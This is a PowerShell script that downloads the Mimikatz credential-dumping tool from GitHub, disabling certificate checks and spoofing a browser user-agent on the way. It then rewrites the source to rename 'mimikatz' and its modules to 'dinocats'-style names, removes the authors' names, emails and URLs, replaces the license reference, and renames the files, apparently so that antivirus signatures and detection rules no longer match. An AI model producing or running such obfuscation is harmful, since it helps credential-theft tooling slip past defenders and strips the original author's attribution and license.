[CmdletBinding()] Param()

Write-Verbose "Downloading......"

$Domain = ""
$User = ""
$Password = ""

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$webClient = New-Object System.NET.WebClient
$webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3578.108 Safari/537.36")
$mimiURL = "https://github.com/gentilkiwi/mimikatz/archive/master.zip"
$destMimi = (Get-Location).Path + "\mimikatz-master.zip"

$webClient.DownloadFile($mimiURL, $destMimi)


Write-Verbose "Saving to `n`t$destKatz `n`t$destMimi"
Expand-Archive $destMimi ($destMimi -replace ".zip")

Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip {
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}


$mimipath = (get-location).path + "\mimikatz-master"
$allfiles = Get-ChildItem $mimipath -recurse | Where-Object { $_.Attributes -notmatch 'directory' } | `
             Where-Object { $_.Extension -match '\.c|\.cs|\.cmd|\.def|\.filters|\.h|\.idl|\.rc|\.sln|\.tlog|\.vcxproj|\.yar'  }
  foreach ($file in $allfiles) {
        (Get-Content $file.PSPath) | `
        ForEach-Object { $_ -replace "mimikatz", "dinocats" `
                            -replace "kiwi", "fruity" `
							-replace "Benjamin", "Marty @xxxx[{::::::::::::::>"`
							-replace "DELPY", "" `
							-replace "gentil", "" `
							-replace "gentilkiwi", "" `
							-replace "oe.eo", "0.o" `
							-replace ".letoux", "" `
							-replace "gmail", "" `
							-replace "https://blog.gentilkiwi.com", "" `
							-replace "https://creativecommons.org/licenses/by/4.0/", "GNU" `
							-replace "_POWERKATZ", "_DINOCATS" `
							-replace "Vincent", "" `
							-replace "LE TOUX", "" `
							-replace "vincent.letoux@gmail.com", "" `
							-replace "https://pingcastle.com", "" `
							-replace "https://mysmartlogon.com", "" `
							-replace "2007", "" `
							-replace "2021", "" `
							-replace "mimilib", "dinolib" `
							-replace "mimidrv", "dinodrv" `
							-replace "mimilove", "dinolove" `
							-replace "mimispool", "dinospool" `

						} | `
        Set-Content $file.PSPath
    }

Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimikatz" } | Rename-Item -NewName { $_.name -replace "mimikatz", "dinocats" }
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimilib" } | Rename-Item -NewName { $_.name -replace "mimilib", "dinolib" }
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimidrv" } | Rename-Item -NewName { $_.name -replace "mimidrv", "dinodrv" }
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimilove" } | Rename-Item -NewName { $_.name -replace "mimilove", "dinolove" }
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimispool" } | Rename-Item -NewName { $_.name -replace "mimispool", "dinospool" }
